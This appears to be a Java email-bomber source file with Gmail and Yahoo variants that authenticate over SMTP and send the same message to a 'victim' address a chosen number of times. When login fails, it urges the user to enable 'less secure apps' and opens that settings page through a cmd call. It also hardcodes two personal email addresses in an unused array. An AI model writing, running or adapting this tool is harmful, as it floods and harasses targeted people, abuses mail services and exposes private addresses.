package mail;
import java.awt.List;
import java.util.ArrayList;
import java.util.Properties;
import javax.mail.AuthenticationFailedException;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;

public class main_mail {

    String status = "";

    void gmail_boomb(String username, String pass, String victim, String subject, String msg, int number) {
        //Using SSL coonection
        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, pass);
                    }
                });
        String arr[]={"appelmahmud74@gmail.com","akiba16@yahoo.com"};
        

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            for(int a=0;a<=arr.length;a++){}
            
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(victim));
            message.setSubject(subject);
            message.setText(msg);
            status = "Connected Successfully.....\n";
            for (int i = 1; i <= number; i++) {
                Transport.send(message);
                status = "Email: " + i + "Sent Successful";
                //System.out.println("Message: " + i + "Sent Done");
                //Thread.sleep(100);
            }

            System.out.println("All Email Sent Successfully");

        } catch (AuthenticationFailedException a) {
            try {
                int dresult = JOptionPane.showConfirmDialog(null, "Authentication Failed.\nDo you want to allow access less secure Apps??");
                if (dresult == JOptionPane.YES_OPTION) {
                    Process P;
                    P = Runtime.getRuntime().exec("cmd /c start " + "https://myaccount.google.com/lesssecureapps" + "");
                }
            } catch (Exception es) {

            }
        } catch (MessagingException e) {
            //throw new RuntimeException(e);
            //status=e.getMessage();
            JOptionPane.showMessageDialog(null, e);
        }

    }

    void yahoo_boomb(String username, String pass, String victim, String subject, String msg, int number) {

        Properties props = new Properties();
        //Used for tls connection
        //props.put("mail.smtp.auth", "true");
        //props.put("mail.smtp.starttls.enable", "true");

        //Use for gmail
        //props.put("mail.smtp.host", "smtp.gmail.com");
        //props.put("mail.smtp.port", "587");
        //use for yahoo
        //props.put("mail.smtp.host", "smtp.mail.yahoo.com");
        //props.put("mail.smtp.port", "465");
        //used for ssl connection
        props.put("mail.smtp.host", "smtp.mail.yahoo.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, pass);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(victim));
            message.setSubject(subject);
            message.setText(msg);
            status = "Connected Successfully.....\n";
            for (int i = 1; i <= number; i++) {
                Transport.send(message);
                status = "Email: " + i + "Sent Successful";
                //System.out.println("Message: " + i + "Send Done");
                //Thread.sleep(100);
            }

            System.out.println("All Email Sent Successfully");

        } catch (AuthenticationFailedException a) {
            try {
                int dresult = JOptionPane.showConfirmDialog(null, "Authentication Failed.\nDo you want to allow access less secure Apps??");
                if (dresult == JOptionPane.YES_OPTION) {
                    Process P;
                    P = Runtime.getRuntime().exec("cmd /c start " + "https://login.yahoo.com/account/security#lesssecureapps" + "");
                }
            } catch (Exception es) {

            }
        }
        
        
        catch (MessagingException e) {
            //throw new RuntimeException(e);
            //status=;
            System.out.println(e.getMessage());

        }
    }
}
